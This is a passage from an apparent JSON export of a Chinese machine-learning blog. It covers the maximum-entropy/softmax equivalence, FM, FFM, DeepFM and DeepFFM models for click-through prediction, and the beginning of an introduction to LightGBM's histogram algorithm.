\\end{align*} \\] 令偏导为0，得： \\[ h_j^{(i)} = e^{-1+ \\alpha_i + {\\bf w_j^Tx^{(i)} } }\\tag{3-9} \\] 又因为\\(\\sum_{j=1}^K h_j^{(i)}= 1\\)因此有： \\[ \\begin{align*} \\sum_{j=1}^Kh_j^{(i)} &amp;= \\sum_{j=1}^Ke^{-1+ \\alpha_i - {\\bf w_j^Tx^{(i)} } } = e^{\\alpha_i} \\sum_{j=1}^Ke^{-1+ {\\bf w_j^Tx^{(i)} }} =1\\\\ e^{\\alpha_i} &amp;= \\frac{1}{\\sum_{j=1}^Ke^{-1+ {\\bf w_j^Tx^{(i)} }} } \\end{align*} \\] 将上式带入3-9，得： \\[ \\begin{align*} h_j^{(i)} &amp;= \\frac{e^{-1+{\\bf w_j^Tx^{(i)} }} }{\\sum_{j=1}^Ke^{-1+ {\\bf w_j^Tx^{(i)} }} }\\\\ &amp;= \\frac{e^{ {\\bf w_j^Tx^{(i)} }} }{\\sum_{j=1}^Ke^{ {\\bf w_j^Tx^{(i)} }} } \\end{align*} \\] 这就是Softmax！得到了Softmax，也就得到了Sigmoid，因为那是K=2的特殊情况。 回想一下我们做了啥，首先对Softmax求导，令其导数为0，得到了Softmax需要满足的约束，然后在满足约束的情况下求解 最大熵模型即可，得到的正是 Softmax 模型，所以两者是等价的。 最大熵模型和Softmax等价性理解 其实从公事上看，最大熵模型和Softmax很像，就是最大熵模型里有个特征函数\\(f\\)。 之前我们推导的最大熵模型为： \\[ P_w = P(y|x) = \\frac{1}{Z_w(x)}e^{\\sum_{i=1}^d {w_i}f_i(x, y)} \\\\ 其中 , Z_w(x) =\\sum_y e^{\\sum_{i=1}^d w_i f_i(x, y) } \\] 其相应的y为标量，表示第K个类别，而我们的Softmax的y则为类别one-hot后的向量。 如果把最大熵模型写为向量的形式，即 \\[ P_w = P(y|x) = \\frac{1}{Z_w(x)}e^{ {\\bf w^Tf}({\\bf x}, y)}\\\\ 其中 , Z_w(x) =\\sum_y e^{ {\\bf w^Tf}({\\bf x}, y) } \\] 最大熵模型有一个特征函数\\(f\\)，如果将特征函数用如下表示： \\[ f({\\bf x^{(i)} }, y^{(i)}) = \\left\\{ \\begin{array}{ll} {\\bf x^{(i)} }, &amp;y^{(i)} =k\\\\ 0, &amp;\\text{otherwise} \\end{array} \\right. \\] 则最大熵模型相当于： \\[ P_w = P(y_k^{(i)}=k|x) = \\frac{1}{Z_w(x)}e^{\\bf w^Tx^{(i)} }\\\\ 其中 , Z_w(x) =\\sum_y e^{ {\\bf w^Tf}({\\bf x}, y_j = k) } \\] 是不是和Softmax一样了！ 其实，特征函数就相当于模型的眼睛： 给模型一句自然语言，它肯定不认识。我们必须抽出像 n 元组（n-gram）、 词性（part-of-speech tag）等特征，才能把数据传给模型。 from 如何理解最大熵模型里面的特征？ - Semiring的回答 - 知乎 https://www.zhihu.com/question/24094554/answer/108271031 参考资料 《统计学习方法》 - 李航 Logistic 最大熵 朴素贝叶斯 HMM MEMM CRF 几个模型的总结 最大熵与逻辑回归的等价性 最大熵学习笔记（三）最大熵模型 深入机器学习系列21-最大熵模型","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』FM、FFM与DeepFM","slug":"machine-learning-fm-ffm-deepfm-deepffm","date":"2018-06-15T03:48:57.000Z","updated":"2020-10-29T15:34:30.624Z","comments":true,"path":"machine-learning-fm-ffm-deepfm-deepffm/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-fm-ffm-deepfm-deepffm/","excerpt":"FM和FMM模型在数据量比较大并且特征稀疏的情况下，仍然有优秀的性能表现，在CTR/CVR任务上尤其突出。 近些年来，深度学习的方法也开始应用在广告计算领域，因此本文也会对FM和FFM的深度学习版本做一个介绍。 本文包括： FM 模型 FFM 模型 Deep FM 模型 Deep FFM模型","text":"FM和FMM模型在数据量比较大并且特征稀疏的情况下，仍然有优秀的性能表现，在CTR/CVR任务上尤其突出。 近些年来，深度学习的方法也开始应用在广告计算领域，因此本文也会对FM和FFM的深度学习版本做一个介绍。 本文包括： FM 模型 FFM 模型 Deep FM 模型 Deep FFM模型 FM模型的引入-广告特征的稀疏性 FM（Factorization machines）模型由Steffen Rendle于2010年提出，目的是解决稀疏数据下的特征组合问题。 在介绍FM模型之前，来看看稀疏数据的训练问题。 以广告CTR（click-through rate）点击率预测任务为例，假设有如下数据： Clicked? Country Day Ad_type 1 USA 26/11/15 Movie 0 China 19/2/15 Game 1 China 26/11/15 Game 第一列Clicked是类别标记，标记用户是否点击了该广告，而其余列则是特征（这里的三个特征都是类别类型），一般的，我们会对数据进行One-hot编码将类别特征转化为数值特征，转化后数据如下: Clicked? Country=USA Country=China Day=26/11/15 Day=19/2/15 Ad_type=Movie Ad_type=Game 1 1 0 1 0 1 0 0 0 1 0 1 0 1 1 0 1 1 0 0 1 经过One-hot编码后，特征空间是十分稀疏的。特别的，某类别特征有m种不同的取值，则one-hot编码后就会被变为m维！当类别特征越多、类别特征的取值越多，其特征空间就更加稀疏。 此外，往往我们会将特征进行两两的组合，这是因为： 通过观察大量的样本数据可以发现，某些特征经过关联之后，与label之间的相关性就会提高。例如，“USA”与“Thanksgiving”、“China”与“Chinese New Year”这样的关联特征，对用户的点击有着正向的影响。换句话说，来自“China”的用户很可能会在“Chinese New Year”有大量的浏览、购买行为，而在“Thanksgiving”却不会有特别的消费行为。这种关联特征与label的正向相关性在实际问题中是普遍存在的，如“化妆品”类商品与“女”性，“球类运动配件”的商品与“男”性，“电影票”的商品与“电影”品类偏好等。 再比如，用户更常在饭点的时间下载外卖app，因此，引入两个特征的组合是非常有意义的。 如何表示两个特征的组合呢？一种直接的方法就是采用多项式模型来表示两个特征的组合，\\(x_i\\)为第\\(i\\)个特征的取值（注意和以往表示第\\(i\\)个样本的特征向量的区别），\\(x_ix_j\\)表示特征\\(x_i\\)和\\(x_j\\)的特征组合，其系数\\(w_{ij}\\)即为我们学习的参数，也是\\(x_ix_j\\)组合的重要程度： \\[ \\hat y(\\mathbf{x}) = w_0+ \\sum_{i=1}^d w_i x_i + \\sum_{i=1}^d \\sum_{j=i+1}^d w_{ij} x_i x_j \\tag{1-1} \\] 式1-1也可以称为Poly2(degree-2 poly-nomial mappings)模型。注意到式子1-1中参数的个数是非常多的！一次项有d+1个，二次项（即组合特征的参数）共有\\(\\frac{d(d-1)}{2}\\)个，而参数与参数之间彼此独立，在稀疏场景下，二次项的训练是很困难的。因为要训练\\(w_{ij}\\)，需要有大量的\\(x_i\\)和\\(x_j\\)都非零的样本（只有非零组合才有意义）。而样本本身是稀疏的，满足\\(x_ix_j \\ne 0\\)的样本会非常少，样本少则难以估计参数\\(w_{ij}\\)，训练出来容易导致模型的过拟合。 为此，Rendle于2010年提出FM模型，它能很好的求解式1-1，其特点如下： FM模型可以在非常稀疏的情况下进行参数估计 FM模型是线性时间复杂度的，可以直接使用原问题进行求解，而且不用像SVM一样依赖支持向量。 FM模型是一个通用的模型，其训练数据的特征取值可以是任意实数。而其它最先进的分解模型对输入数据有严格的限制。FMs可以模拟MF、SVD++、PITF或FPMC模型。 FM模型 前面提到过，式1-1的参数难以训练时因为训练数据的稀疏性。对于不同的特征对\\(x_i,x_j\\)和\\(x_i,x_k\\)，式1-1认为是完全独立的，对参数\\(w_{ij}\\)和\\(w_{ik}\\)分别进行训练。而实际上并非如此，不同的特征之间进行组合并非完全独立，如下图所示: fm-feaure-pair 回想矩阵分解，一个rating可以分解为user矩阵和item矩阵，如下图所示： fm-matrix-factorization 分解后得到user和item矩阵的维度分别为\\(nk\\)和\\(km\\)，（k一般由用户指定），相比原来的rating矩阵，空间占用得到降低，并且分解后的user矩阵暗含着user偏好，Item矩阵暗含着item的属性，而user矩阵乘上item矩阵就是rating矩阵中用户对item的评分。 因此，参考矩阵分解的过程，FM模型也将式1-1的二次项参数\\(w_{ij}\\)进行分解： \\[ \\hat y(\\mathbf{x}) = w_0+ \\sum_{i=1}^d w_i x_i + \\sum_{i=1}^d \\sum_{j=i+1}^d ( \\mathbf{v}_i \\cdot \\mathbf{v}_j ) x_i x_j \\tag{2-1} \\] 其中\\(v_i\\)是第\\(i\\)维特征的隐向量，其长度为\\(k (k\\ll d)\\)。 \\((\\mathbf{v}_i \\cdot \\mathbf{v}_j)\\)为内积，其乘积为原来的\\(w_{ij}\\)，即 \\(\\hat w_{ij} = ( \\mathbf{v}_i \\cdot \\mathbf{v}_j ) = \\sum_{f=1}^kv_{i,f} \\cdot v_{j,f}\\) 为了方便说明，考虑下面的数据集（实际中应该进行one-hot编码，但并不影响此处的说明）： 数据集 Clicked? Publisher Advertiser Poly2参数 FM参数 训练集 1 NBC Nike \\(w_{NBC, Nike}\\) \\(V_{NBC} \\cdot V_{Nike}\\) 训练集 0 EPSN Adidas \\(w_{EPSN, Adidas}\\) \\(V_{EPSN} \\cdot V_{Adidas}\\) 测试集 ? NBC Adidas \\(w_{NBC, Adidas}\\) \\(V_{NBC} \\cdot V_{Adidas}\\) 对于上面的训练集，没有（NBC，Adidas）组合，因此，Poly2模型就无法学习到参数\\(w_{NBC, Adidas}\\)。而FM模型可以通过特征组合(NBC，Nike)、(EPSN，Adidas) 分别学习到隐向量\\(V_{NBC}\\)和\\(V_{Adidas}\\)，这样使得在测试集中得以进行预测。 更一般的，经过分解，式2-1的参数个数减少为\\(kd\\)个，对比式1-1，参数个数大大减少。使用小的k，使得模型能够提高在稀疏情况下的泛化性能。此外，将\\(w_{ij}\\)进行分解，使得不同的特征对不再是完全独立的，而它们的关联性可以用隐式因子表示，这将使得有更多的数据可以用于模型参数的学习。比如\\(x_i,x_j\\)与\\(x_i,x_k\\)的参数分别为：\\(\\langle\\mathbf{v}_i, \\mathbf{v}_j \\rangle\\)和\\(\\langle\\mathbf{v}_i, \\mathbf{v}_k \\rangle\\)，它们都可以用来学习\\(\\mathbf v_i\\)，更一般的，包含\\(x_i x_j \\ne 0 \\&amp; i\\ne j\\)的所有样本都能用来学习\\(\\mathbf v_i\\)，很大程度上避免了数据稀疏性的影响。 此外，式2-1的复杂度可以从\\(O(kd^2)\\)优化到\\(O(kd)\\)： \\[ \\begin{align*} &amp;\\sum_{i=1}^d \\sum_{j=i+1}^d \\langle \\mathbf{v}_i, \\mathbf{v}_j \\rangle x_i x_j \\\\ =&amp; \\frac{1}{2} \\sum_{i=1}^d\\sum_{j=1}^d \\langle \\mathbf{v}_i, \\mathbf{v}_j \\rangle x_i x_j - \\frac{1}{2}\\sum_{i=1}^d \\langle \\mathbf{v}_i, \\mathbf{v}_j \\rangle x_i x_i\\\\ =&amp; \\frac{1}{2} \\sum_{i=1}^d\\sum_{j=1}^d\\sum_{f=1}^k v_{i,f}v_{j,f} x_i x_j - \\frac{1}{2}\\sum_{i=1}^d \\sum_{f=1}^k v_{i,f}v_{i,f}x_i x_i\\\\ =&amp; \\frac{1}{2} \\sum_{f=1}^k \\left( \\left(\\sum_{i=1}^dv_{i,f}x_i \\right) \\left(\\sum_{j=1}^dv_{j,f}x_j \\right) - \\sum_{i=1}^d v_{i,f}^2x_i^2\\right) \\\\ =&amp;\\frac{1}{2} \\sum_{f=1}^k \\left( \\left(\\sum_{i=1}^dv_{i,f}x_i \\right) ^2 - \\sum_{i=1}^d v_{i,f}^2x_i^2\\right) \\tag{2-2} \\end{align*} \\] 可以看出，FM模型可以在线性的时间做出预测。 FM模型学习 把2-2和2-1合并，得到等价的FM模型公式2-3： \\[ \\hat y(\\mathbf{x}) = w_0+ \\sum_{i=1}^d w_i x_i + \\frac{1}{2} \\sum_{f=1}^k \\left( \\left(\\sum_{i=1}^dv_{i,f}x_i \\right) ^2 - \\sum_{i=1}^d v_{i,f}^2x_i^2\\right) \\tag{2-3} \\] FM模型可以使用梯度下降法进行学习，模型的梯度为： \\[ \\frac{\\partial}{\\partial\\theta} y (\\mathbf{x}) = \\left\\{\\begin{array}{ll} 1, &amp; \\text{if}\\; \\theta\\; \\text{is}\\; w_0 \\\\ x_i, &amp; \\text{if}\\; \\theta\\; \\text{is}\\; w_i \\\\ x_i \\sum_{j=1}^d v_{j, f} x_j - v_{i, f} x_i^2, &amp; \\text{if}\\; \\theta\\; \\text{is}\\; v_{i, f} \\end{array}\\right. \\tag{2-4} \\] 在2-4式中，\\(\\sum_{j=1}^d v_{j, f} x_j\\)只与\\(f\\)有关而与\\(i\\)无关，在每次迭代过程中，可以预先对所有\\(f\\)的\\(\\sum_{j=1}^d v_{j, f} x_j\\)进行计算，复杂度\\(O(kd)\\)，就能在常数时间\\(O(1)\\)内得到\\(v_{i,f}\\)的梯度。而对于其它参数\\(w_0\\)和\\(w_i\\)，显然也是在常数时间内计算梯度。此外，更新参数只需要\\(O(1)\\), 一共有\\(1+d+kd\\)个参数，因此FM参数训练的复杂度也是\\(O(kd)\\)。 所以说，FM模型是一种高效的模型，是线性时间复杂度的，可以在线性的时间做出训练和预测。 FFM模型 考虑下面的数据集： Clicked? Publisher(P) Advertiser(A) Gender(G) 1 EPSN Nike Male 0 NBC Adidas Female 对于第一条数据来说，FM模型的二次项为：\\({\\bf w}_{EPSN} \\cdot {\\bf w}_{Nike} + {\\bf w}_{EPSN} \\cdot {\\bf w}_{Male} + {\\bf w}_{Nike} \\cdot {\\bf w}_{Male}\\)。（这里只是把上面的v符合改成了w）每个特征只用一个隐向量来学习和其它特征的潜在影响。对于上面的例子中，Nike是广告主，Male是用户的性别，描述（EPSN，Nike）和（EPSN，Male）特征组合，FM模型都用同一个\\({\\bf w}_{ESPN}\\)，而实际上，ESPN作为广告商，其对广告主和用户性别的潜在影响可能是不同的。 因此，Yu-Chin Juan借鉴Michael Jahrer的论文（Ensemble of collaborative filtering and feature engineered models for click through rate prediction），将field概念引入FM模型。 field是什么呢？即相同性质的特征放在一个field。比如EPSN、NBC都是属于广告商field的，Nike、Adidas都是属于广告主field，Male、Female都是属于性别field的。简单的说，同一个类别特征进行one-hot编码后生成的数值特征都可以放在同一个field中，比如最开始的例子中Day=26/11/15 Day=19/2/15可以放于同一个field中。如果是数值特征而非类别，可以直接作为一个field。 引入了field后，对于刚才的例子来说，二次项变为： \\[ \\underbrace{ {\\bf w}_{EPSN, A} \\cdot {\\bf w}_{Nike, P} }_{P \\times A} + \\underbrace{ {\\bf w}_{EPSN, G} \\cdot {\\bf w}_{Male,P} }_{P \\times G} + \\underbrace{ { {\\bf w}_{Nike, G} \\cdot {\\bf w}_{Male,A} } }_{A \\times G} \\] 对于特征组合（EPSN，Nike）来说，其隐向量采用的是\\({\\bf w}_{EPSN,A}\\)和\\({\\bf w}_{Nike, P}\\)，对于\\({\\bf w}_{EPSN,A}\\)这是因为Nike属于广告主（Advertiser）的field，而第二项\\({\\bf w}_{Nike, P}\\)则是EPSN是广告商（Publisher）的field。 再举个例子，对于特征组合（EPSN，Male）来说，\\({\\bf w}_{EPSN, G}\\) 是因为Male是用户性别(Gender)的field，而第二项\\({\\bf w}_{Male,P}\\)是因为EPSN是广告商（Publisher）的field。 下面的图来自criteo，很好的表示了三个模型的区别 For Poly2, a dedicated weight is learned for each feature pair: poly2-model-example For FMs, each feature has one latent vector, which is used to interact with any other latent vectors: fm-model-example For FFMs, each feature has several latent vectors, one of them is used depending on the field of the other feature: ffm-model-example FFM 数学公式 因此，FFM的数学公式表示为： \\[ y(\\mathbf{x}) = w_0 + \\sum_{i=1}^d w_i x_i + \\sum_{i=1}^d \\sum_{j=i+1}^d (w_{i, f_j} \\cdot w_{j, f_i}) x_i x_j \\tag{3-1} \\] 其中\\(f_i\\)和\\(f_j\\)分别代表第i个特征和第j个特征所属的field。若field有\\(f\\)个，隐向量的长度为k，则二次项系数共有\\(dfk\\)个，远多于FM模型的\\(dk\\)个。此外，隐向量和field相关，并不能像FM模型一样将二次项化简，计算的复杂度是\\(d^2k\\)。 通常情况下，每个隐向量只需要学习特定field的表示，所以有\\(k_{FFM} \\ll k_{FM}\\)。 FFM 模型学习 为了方便推导，这里省略FFM的一次项和常数项，公式为： \\[ \\phi(\\mathbf{w}, \\mathbf{x}) =\\sum_{a=1}^d \\sum_{b=a+1}^d ( w_{a, f_b} \\cdot w_{b, f_a}) x_a x_b\\tag{3-2} \\] FFM模型使用logistic loss作为损失函数，并加上L2正则项： \\[ \\mathcal{L} = \\sum_{i=1}^N\\log\\left(1 + \\exp(-y_i\\phi({\\bf w}, {\\bf x_i}))\\right) + \\frac{\\lambda}{2} |\\!|{\\bf w}|\\!|^2 \\tag{3-3} \\] 采用随机梯度下降来（SGD）来优化损失函数，因此，损失函数只采用单个样本的损失： \\[ \\mathcal{L} =\\log\\left(1 + \\exp(-y_i\\phi({\\bf w}, {\\bf x}))\\right) + \\frac{\\lambda}{2} |\\!|{\\bf w}|\\!|^2 \\tag{3-4} \\] 对于每次迭代，选取一条数据\\(({\\bf x}, y)\\)，然后让L对\\({\\bf w}_{a,f_b}\\)和\\({\\bf w}_{b,f_a}\\)求偏导（注意，采用SGD上面的求和项就去掉了，只采用单个样本的损失），得： \\[ \\begin{align*} g_{a,f_b} \\equiv \\frac{\\partial \\mathcal{L} }{\\partial w_{a,f_b} } = \\kappa\\cdot w_{b, f_a} x_a x_b + \\lambda w_{a,f_b}^2 \\tag{3-5} \\\\ g_{b,f_a} \\equiv \\frac{\\partial \\mathcal{L} }{\\partial w_{b,f_a} } = \\kappa\\cdot w_{a, f_b} x_a x_b + \\lambda w_{b,f_a}^2 \\tag{3-6}\\\\ 其中, \\kappa = \\frac{-y}{1+\\exp(y\\phi({\\bf w,x}))} \\end{align*} \\] 在具体的实现中，这里有两个trick，第一个trick是梯度的分步计算。 \\[ \\mathcal{L} = \\mathcal{L} _{err} + \\mathcal{L} _{reg} = \\log\\left(1 + \\exp(-y_i\\phi({\\bf w}, {\\bf x}))\\right) + \\frac{\\lambda}{2} |\\!|{\\bf w}|\\!|^2\\\\ \\frac{\\partial\\mathcal{L} }{\\partial\\mathbf{w} } = \\frac{\\partial\\mathcal{L}_{err} }{\\partial\\phi}\\cdot \\frac{\\partial\\phi}{\\partial\\mathbf{w} } + \\frac{\\partial\\mathcal{L}_{reg} }{\\partial\\mathbf{w} } \\] 注意到\\(\\frac{\\partial\\mathcal{L}_{err} }{\\partial\\phi}\\)和参数无关，每次更新模型时，只需要计算一次，之后直接调用结果即可。对于总共有\\(dfk\\)个模型参数的计算来说，使用这种方式能极大提升运算效率。 第二个trick是FFM的学习率是随迭代次数变化的，具体的是采用AdaGrad算法，这里进行简单的介绍。 Adagrad算法能够在训练中自动的调整学习率，对于稀疏的参数增加学习率，而稠密的参数则降低学习率。因此，Adagrad非常适合处理稀疏数据。 设\\(g_{t,j}\\)为第t轮第j个参数的梯度，则SGD和采用Adagrad的参数更新公式分别如下： \\[ \\begin{align*} SGD: \\ &amp; w_{t+1,j} = w_{t,j} -\\eta \\cdot g_{t,j} \\\\ Adagrad: \\ &amp; w_{t+1,j} = w_{t,j} - \\frac{\\eta}{\\sqrt{G_{t,jj}+ \\epsilon} } \\cdot g_{t,j} \\end{align*} \\] 可以看出，Adagrad在学习率\\(\\eta\\)上还除以一项\\(\\sqrt{G_{t,jj}+ \\epsilon}\\)，这是什么意思呢？\\(\\epsilon\\)为平滑项，防止分母为0，\\(G_{t,jj} = \\sum_{\\iota=1}^tg_{\\iota, jj}^2\\)即\\(G_{t,jj}\\)为对角矩阵，每个对角线位置\\(j,j\\)的值为参数\\(w_j\\)每一轮的平方和，可以看出，随着迭代的进行，每个参数的历史梯度累加到一起，使得每个参数的学习率逐渐减小。 因此，用3-5、3-6计算完梯度后，下一步就是更新分母的对角矩阵。 \\[ \\begin{align*} G_{a,f_b} \\leftarrow G_{a,f_b} + (g_{a,f_b})^2 \\tag{3-7}\\\\ G_{b,f_a} \\leftarrow G_{b,f_a} + (g_{b,f_a})^2 \\tag{3-8} \\end{align*} \\] 最后，更新模型参数： \\[ \\begin{align*} w_{a,f_b} &amp;\\leftarrow w_{a,f_b} - \\frac{\\eta}{\\sqrt{G_{a,f_b}+ 1} }g_{a,f_b} \\tag{3-9}\\\\ w_{b,f_a} &amp;\\leftarrow w_{b,f_a} - \\frac{\\eta}{\\sqrt{G_{b,f_a}+ 1} }g_{b,f_a} \\tag{3-10} \\end{align*} \\] 这就是论文中算法1描述的过程： ffm-model-training 实现的trick 本小节主要摘录美团点评的内容。 除了上面提到的梯度分步计算和自适应学习率两个trick外，还有： OpenMP多核并行计算。OpenMP是用于共享内存并行系统的多处理器程序设计的编译方案，便于移植和多核扩展[12]。FFM的源码采用了OpenMP的API，对参数训练过程SGD进行了多线程扩展，支持多线程编译。因此，OpenMP技术极大地提高了FFM的训练效率和多核CPU的利用率。在训练模型时，输入的训练参数ns_threads指定了线程数量，一般设定为CPU的核心数，便于完全利用CPU资源。 SSE3指令并行编程。SSE3全称为数据流单指令多数据扩展指令集3，是CPU对数据层并行的关键指令，主要用于多媒体和游戏的应用程序中[13]。SSE3指令采用128位的寄存器，同时操作4个单精度浮点数或整数。SSE3指令的功能非常类似于向量运算。例如，a和b采用SSE3指令相加（a和b分别包含4个数据），其功能是a种的4个元素与b中4个元素对应相加，得到4个相加后的值。采用SSE3指令后，向量运算的速度更加快捷，这对包含大量向量运算的FFM模型是非常有利的。 除了上面的技巧之外，FFM的实现中还有很多调优技巧需要探索。例如，代码是按field和特征的编号申请参数空间的，如果选取了非连续或过大的编号，就会造成大量的内存浪费；在每个样本中加入值为1的新特征，相当于引入了因子化的一次项，避免了缺少一次项带来的模型偏差等。 适用范围和使用技巧 在FFM原论文中，作者指出，FFM模型对于one-hot后类别特征十分有效，但是如果数据不够稀疏，可能相比其它模型提升没有稀疏的时候那么大，此外，对于数值型的数据效果不是特别的好。 在Github上有FFM的开源实现，要使用FFM模型，特征需要转化为“field_id:feature_id:value”格式，相比LibSVM的格式多了field_id，即特征所属的field的编号，feature_id是特征编号，value为特征的值。 此外，美团点评的文章中，提到了训练FFM时的一些注意事项： 第一，样本归一化。FFM默认是进行样本数据的归一化的 。若不进行归一化，很容易造成数据inf溢出，进而引起梯度计算的nan错误。因此，样本层面的数据是推荐进行归一化的。 第二，特征归一化。CTR/CVR模型采用了多种类型的源特征，包括数值型和categorical类型等。但是，categorical类编码后的特征取值只有0或1，较大的数值型特征会造成样本归一化后categorical类生成特征的值非常小，没有区分性。例如，一条用户-商品记录，用户为“男”性，商品的销量是5000个（假设其它特征的值为零），那么归一化后特征“sex=male”（性别为男）的值略小于0.0002，而“volume”（销量）的值近似为1。特征“sex=male”在这个样本中的作用几乎可以忽略不计，这是相当不合理的。因此，将源数值型特征的值归一化到[0,1]是非常必要的。 第三，省略零值特征。从FFM模型的表达式(3-1)可以看出，零值特征对模型完全没有贡献。包含零值特征的一次项和组合项均为零，对于训练模型参数或者目标值预估是没有作用的。因此，可以省去零值特征，提高FFM模型训练和预测的速度，这也是稀疏样本采用FFM的显著优势。 DeepFM FM模型可以用神经网络进行表示[3]： deep-fm-part 模型输入\\(x = [x_{field_1}, x_{field_2}, \\cdots, x_{field_m}]\\)，这是一个d维的向量，其中\\(x_{field_i}\\)即为第i个field的特征表示，如果是类别，则为one-hot编码后的向量，连续值则为它本身。 然后对每个field分别进行embedding，如下图： deep-embedding 值得注意的是，即使各个field的维度是不一样的，但是它们embedding后长度均为k。 接着FM层即为embedding后结果的内积和一次项的和，最后一层sigmoid后再输出结果。 看到这里，可能你感到困惑的就是embedding层，这么表示是为啥？答案是这样表示和fm模型等价！ 假设第i个field 向量维度为k，embedding层的参数可以表示为一个k * m的矩阵 \\[ V_{field_i}= \\begin{bmatrix} v_{11} &amp; v_{21} &amp; \\cdots &amp; v_{m1} \\\\ v_{12} &amp; v_{22} &amp; \\cdots &amp; v_{m2} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ v_{1k} &amp; v_{2k} &amp; \\cdots &amp; v_{md} \\\\ \\end{bmatrix} \\] 其中\\(v_{ab}\\)可以理解为第a个取值embedding后的结果在隐向量的第b维。 由于进行了one-hot编码，所以对应的\\(\\bf x_{filed_i}\\)只有一个值为1，其余的都为0,假设第c列为1，则： \\[ V_{field_i}\\times {\\bf x_{field_i} }=\\begin{bmatrix} v_{11} &amp; v_{21} &amp; \\cdots &amp; v_{m1} \\\\ v_{12} &amp; v_{22} &amp; \\cdots &amp; v_{m2} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ v_{1k} &amp; v_{2k} &amp; \\cdots &amp; v_{md} \\\\ \\end{bmatrix} \\times \\begin{bmatrix} 0 \\\\ \\vdots \\\\1\\\\ \\vdots \\\\ \\end{bmatrix} = \\begin{bmatrix} v_{c1}\\\\ v_{c2} \\\\ \\vdots \\\\ v_{ck} \\end{bmatrix} x_c= V_c x_c \\] 若两个field做内积，假设非0的那一列为c和d则： \\[ (V_{field_i} \\ x_{field_i}) (V_ {field_j}\\ x_{field_j})=( \\mathbf{V}_c \\cdot \\mathbf{V}_d ) x_c x_d \\] 其实和FM模型是一样的！ DeepFM的模型如下图： deep-fm 左边就是刚才将的FM模型的神经网络表示，而右边的则为deep部分，为全连接的网络，用于挖掘高阶的交叉特征。整个模型共享embedding层，最后的结果就是把FM部分和DNN的部分做sigmoid： \\[ Y = sigmoid(Y_{FM} + Y_{DNN}) \\] DeepFFM 类似于FFM对于FM模型来说，划分了field，对于不同的field内积时采用对应的隐向量。同样可以把DeepFM进行进化为DeepFFM，即将每一个field embedding为m个维度为k的隐向量（m为field的个数） 可以参考下图（不过下图没有FFM模型二次项的乘积，实际中也可以加上） deep-ffm 参考资料 Rendle, Steffen. \"Factorization machines.\" Data Mining (ICDM), 2010 IEEE 10th International Conference on. IEEE, 2010. Juan, Yuchin, et al. \"Field-aware factorization machines for CTR prediction.\" Proceedings of the 10th ACM Conference on Recommender Systems. ACM, 2016. Guo, Huifeng, et al. \"Deepfm: A factorization-machine based neural network for CTR prediction.\" arXiv preprint arXiv:1703.04247 (2017). 深入FFM原理与实践 Factorization Machines CTR Prediction: From Linear Models to Field-aware Factorization Machines","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』集成学习（四）LightGBM","slug":"machine-learning-lightgbm","date":"2018-05-30T07:10:08.000Z","updated":"2020-10-19T14:35:48.803Z","comments":true,"path":"machine-learning-lightgbm/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-lightgbm/","excerpt":"本文介绍LightGBM，它是一款常用的GBDT工具包，由微软亚洲研究院（MSRA）进行开发，在Github上开源的三天内收获1000 star。其速度比XGBoost快，并且精度也相当的不错。 接下来看看其算法的内容。 注意其设计理念： 单个机器在不牺牲速度的情况下，尽可能多地用上更多的数据； 多机并行的时候，通信的代价尽可能地低，并且在计算上可以做到线性加速。 于是其使用分布式 GBDT，选择了基于 histogram 的决策树算法。","text":"本文介绍LightGBM，它是一款常用的GBDT工具包，由微软亚洲研究院（MSRA）进行开发，在Github上开源的三天内收获1000 star。其速度比XGBoost快，并且精度也相当的不错。 接下来看看其算法的内容。 注意其设计理念： 单个机器在不牺牲速度的情况下，尽可能多地用上更多的数据； 多机并行的时候，通信的代价尽可能地低，并且在计算上可以做到线性加速。 于是其使用分布式 GBDT，选择了基于 histogram 的决策树算法。 直方图算法 回顾一下XGBoost中的Exact greedy算法： 对每个特征都按照特征值进行排序 在每个排好序的特征都寻找最优切分点 用最优切分点进行切分 这个算法比较精确，但是缺点明显： 空间消耗大。需要保存数据的特征值。XGBoost采用Block结构，存储指向样本的索引，需要消耗两倍的内存。 时间开销大。在寻找最优切分点时，要对每个特征都进行排序，还要对每个特征的每个值都进行了遍历，并计算增益。 对Cache不友好。使用Block块预排序后，特征对梯度的访问是按照索引来获取的，是一种随机访问，而不同特征访问顺序也不一样，容易照成命中率低的问题。同时，在每一层长树的时候，需要随机访问一个行索引到叶子索引的数组，并且不同特征访问的顺序也不一样，也会造成较大的Cachemiss。 使用直方图算法进行划分点的查找可以很好的克服这些缺点。 PS: XGBoost不是有Cache aware access优化么？但是看LightGBM的对比实验，还是直方图的快。 直方图算法 直方图算法(Histogram algorithm)的做法是把连续的浮点特征值离散化为k个整数（其实又是分桶的思想，而这些桶称为bin）比如\\([0,0.1) \\rightarrow 0,\\ [0.1,0.3) \\rightarrow 1\\)。 同时，将特征根据其所在的bin进行梯度累加。这样，遍历一次数据后，直方图累积了需要的梯度信息，然后可以直接根据直方图，寻找最优的切分点。 LightGBM-histogram 其算法大致描述如下： LightGBM-histogram-algorithm 仔细看上面的伪代码，相信你有几个问题： 如何将特征映射到bin呢？即如何分桶？ 如何构建直方图？直方图算法累加的g是什么？ 构建完直方图如何找最优特征，有用到二阶信息么？ 如何分桶呢？ 首先，在读取数据后，就决定每个特征如何分桶。（在feature_group.h文件中，FeatureGroup 的其中一个构造函数） 那么如何分桶呢？对于数值型特征和类别特征采用不同的做法。 数值型特征 